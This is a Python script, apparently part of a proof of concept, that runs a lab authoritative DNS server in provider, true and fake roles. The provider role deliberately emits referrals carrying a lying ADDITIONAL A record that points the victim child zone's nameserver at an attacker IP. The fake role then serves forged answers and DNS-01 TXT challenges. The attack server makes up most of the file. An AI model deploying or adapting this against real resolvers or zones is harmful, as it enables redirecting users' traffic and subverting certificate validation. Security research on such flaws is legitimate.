#!/usr/bin/env python3
"""
lab_dns.py -- authoritative DNS lab for the "yes, it's a problem" PoC.

Roles
-----
provider : authoritative for --zone; returns a crafted referral for the child
           zone (--child.<zone>): an NS record plus an ADDITIONAL A record
           pointing at the fake IP.
true     : the legitimate nameserver for the victim child zone (true answers).
fake     : the attacker nameserver for the victim child zone (fake answers).

Legacy in-zone fixture (no --child-ns): the child-NS name is ns.true.<zone>,
inside the provider zone; the provider also answers A for that name, so the
model shows a lying ADDITIONAL record rather than a strict out-of-bailiwick
failure.  Names under true.<zone> resolve normally.

External child-NS contract (--child-ns, the deployment topology): the child
zone is delegated to an NS name OUTSIDE the provider zone (an ordinary record
in the parent zone, e.g. ns-child.example.com).  The provider's referral
carries that external NS name plus an ADDITIONAL A for it pointing at the
fake IP -- the unrelated-additional shape observed in the public case
recorded in artifacts/.  The provider holds no data for the external NS
name (out-of-zone queries get REFUSED); the parent zone keeps serving its
ordinary A record for the true IP.  The ADDITIONAL lie is data emitted by
this lab authority on the owner's own delegated zone, not a parent-zone
record.

The local comparison checks these contradictory records and the configured
true/fake endpoints; it does not test a recursive resolver or tenant isolation.

Requires dnslib (vendored in ../vendor or installed with pip).
"""
import argparse
import json
import os
import signal
import sys
import threading
import time
from pathlib import Path

try:
    from dnslib import (A, NS, QTYPE, RCODE, RR, SOA, TXT)
    from dnslib.server import BaseResolver, DNSServer, DNSLogger
except ImportError:
    sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "vendor"))
    from dnslib import (A, NS, QTYPE, RCODE, RR, SOA, TXT)
    from dnslib.server import BaseResolver, DNSServer, DNSLogger


def norm(name):
    return str(name).rstrip(".").lower()


def in_zone(name, zone):
    return name == zone or name.endswith("." + zone)


def a_record(name, ip, ttl):
    return RR(name, QTYPE.A, rdata=A(ip), ttl=ttl)


def soa_record(zone, ns, ttl):
    return RR(
        zone,
        QTYPE.SOA,
        rdata=SOA(
            ns,
            "hostmaster." + zone,
            (int(time.time()), 3600, 600, 86400, ttl),
        ),
        ttl=ttl,
    )


class LabResolver(BaseResolver):
    def __init__(self, cfg, role):
        self.cfg = cfg
        self.role = role
        self.zone = norm(cfg["zone"])
        self.child = norm(cfg["child"] + "." + self.zone) if "." not in cfg["child"] else norm(cfg["child"])
        self.provider_ns = norm(cfg["provider_ns"])
        self.child_ns = norm(cfg["child_ns"]) if cfg.get("child_ns") else "ns.true." + self.zone
        self.true_ip = cfg["true_ip"]
        self.fake_ip = cfg["fake_ip"]
        self.ttl = int(cfg["ttl"])
        self.log_path = cfg.get("log")
        self.lock = threading.Lock()
        self.challenge_file = cfg.get("challenge_file")

    # ---------- helpers ----------
    def log(self, request, note):
        if not self.log_path:
            return
        try:
            qname = norm(request.q.qname)
            qtype = QTYPE[request.q.qtype]
            client = request._client if hasattr(request, "_client") else ""
            line = json.dumps({"ts": time.time(), "role": self.role, "qname": qname,
                               "qtype": qtype, "client": str(client), "note": note},
                              ensure_ascii=False)
            with self.lock:
                with open(self.log_path, "a", encoding="utf-8") as fh:
                    fh.write(line + "\n")
        except Exception:
            pass

    def _nxdomain(self, reply, zone):
        reply.header.aa = 1
        reply.header.rcode = RCODE.NXDOMAIN
        reply.add_auth(soa_record(zone, self.provider_ns, self.ttl))
        return reply

    def _txt_challenges(self, qname):
        path = self.challenge_file
        if not path or not os.path.exists(path):
            return []
        try:
            data = json.loads(Path(path).read_text(encoding="utf-8"))
        except Exception:
            return []
        return data.get(norm(qname), [])

    # ---------- provider role ----------
    def provider(self, request, reply):
        qname = norm(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        child = self.child

        # 1. Any query at or below the delegated victim zone -> crafted referral.
        if in_zone(qname, child):
            reply.header.aa = 0
            reply.header.rcode = RCODE.NOERROR
            reply.add_auth(RR(child, QTYPE.NS, rdata=NS(self.child_ns), ttl=self.ttl))
            # The malicious ADDITIONAL A.  The provider also answers A for
            # this name; the lab server deliberately emits the lie here.
            reply.add_ar(a_record(self.child_ns, self.fake_ip, self.ttl))
            self.log(request, "referral-with-malicious-additional")
            return reply

        # 2. Names under true.<zone> remain in the provider zone (no delegation).
        if qname == "true." + self.zone or qname.endswith(".true." + self.zone):
            reply.header.aa = 1
            if qtype == "A":
                reply.add_answer(a_record(qname, self.true_ip, self.ttl))
            elif qtype == "AAAA":
                pass
            else:
                reply.add_auth(soa_record(self.zone, self.provider_ns, self.ttl))
            self.log(request, "provider-ns-a")
            return reply

        # 3. The provider's own zone apex / NS / SOA.
        if qname == self.zone:
            reply.header.aa = 1
            if qtype == "SOA":
                reply.add_answer(soa_record(self.zone, self.provider_ns, self.ttl))
            elif qtype == "NS":
                reply.add_answer(RR(self.zone, QTYPE.NS, rdata=NS(self.provider_ns), ttl=self.ttl))
            elif qtype == "A":
                reply.add_answer(a_record(qname, self.cfg.get("provider_ip", "127.0.0.1"), self.ttl))
            else:
                reply.add_auth(soa_record(self.zone, self.provider_ns, self.ttl))
            self.log(request, "provider-apex")
            return reply

        # 4. Anything else in the provider zone is not authoritative / NXDOMAIN.
        self.log(request, "provider-nxdomain")
        return self._nxdomain(reply, self.zone)

    # ---------- child-zone authoritative role ----------
    def authoritative(self, request, reply):
        qname = norm(request.q.qname)
        qtype = QTYPE[request.q.qtype]
        child = self.child
        ip = self.true_ip if self.role == "true" else self.fake_ip

        if not in_zone(qname, child):
            self.log(request, "not-in-child-zone")
            return self._nxdomain(reply, child)

        reply.header.aa = 1
        if qtype == "A":
            reply.add_answer(a_record(qname, ip, self.ttl))
            note = "true-a" if self.role == "true" else "fake-a"
        elif qtype == "AAAA":
            note = "empty-aaaa"
        elif qtype == "SOA":
            reply.add_answer(soa_record(child, self.child_ns, self.ttl))
            note = "soa"
        elif qtype == "NS":
            reply.add_answer(RR(child, QTYPE.NS, rdata=NS(self.child_ns), ttl=self.ttl))
            note = "ns"
        elif qtype == "TXT":
            vals = self._txt_challenges(qname)
            if vals:
                for val in vals:
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(val), ttl=self.ttl))
                note = "txt-challenge"
            else:
                note = "empty-txt"
        else:
            note = "empty-" + qtype.lower()
        self.log(request, note)
        return reply

    def resolve(self, request, handler):
        try:
            request._client = handler.client_address if handler is not None else ""
        except Exception:
            pass
        reply = request.reply()
        reply.header.ra = 0
        reply.header.ad = 0
        zone = self.zone if self.role == "provider" else self.child
        if not in_zone(norm(request.q.qname), zone):
            reply.header.aa = 0
            reply.header.rcode = RCODE.REFUSED
            return reply
        try:
            if self.role == "provider":
                return self.provider(request, reply)
            return self.authoritative(request, reply)
        except Exception as exc:
            sys.stderr.write("resolve error: %r\n" % (exc,))
            reply.header.rcode = RCODE.SERVFAIL
            return reply


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--role", required=True, choices=["provider", "true", "fake"])
    ap.add_argument("--bind", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--zone", required=True, help="provider zone, e.g. lab.example.com")
    ap.add_argument("--child", default="v", help="child label under zone, e.g. v -> v.lab.example.com")
    ap.add_argument("--provider-ns", required=True, help="NS name for the provider zone")
    ap.add_argument("--child-ns", default=None,
                    help="external NS name for the delegated child zone, outside the provider zone "
                         "(deployment contract); omit for the legacy in-zone fixture")
    ap.add_argument("--true-ip", required=True)
    ap.add_argument("--fake-ip", required=True)
    ap.add_argument("--provider-ip", default=None)
    ap.add_argument("--ttl", default="0")
    ap.add_argument("--log", default=None)
    ap.add_argument("--challenge-file", default=None,
                    help="JSON map of TXT challenges for DNS-01 (optional)")
    args = ap.parse_args()

    cfg = {
        "zone": args.zone,
        "child": args.child,
        "provider_ns": args.provider_ns,
        "child_ns": args.child_ns,
        "true_ip": args.true_ip,
        "fake_ip": args.fake_ip,
        "provider_ip": args.provider_ip or args.bind,
        "ttl": args.ttl,
        "log": args.log,
        "challenge_file": args.challenge_file,
    }
    resolver = LabResolver(cfg, args.role)
    logger = DNSLogger(log="-request,-reply,-truncated,-error")
    servers = [DNSServer(resolver, address=args.bind, port=args.port,
                         tcp=tcp, logger=logger) for tcp in (False, True)]
    for server in servers:
        server.start_thread()
    print("lab_dns role=%s bind=%s:%s zone=%s child=%s" %
          (args.role, args.bind, args.port, args.zone, resolver.child), flush=True)
    print("ready", flush=True)

    stop = threading.Event()

    def _stop(signum, frame):
        stop.set()

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)
    try:
        while not stop.wait(0.2):
            pass
    finally:
        for server in servers:
            server.stop()
            server.server.server_close()


if __name__ == "__main__":
    main()
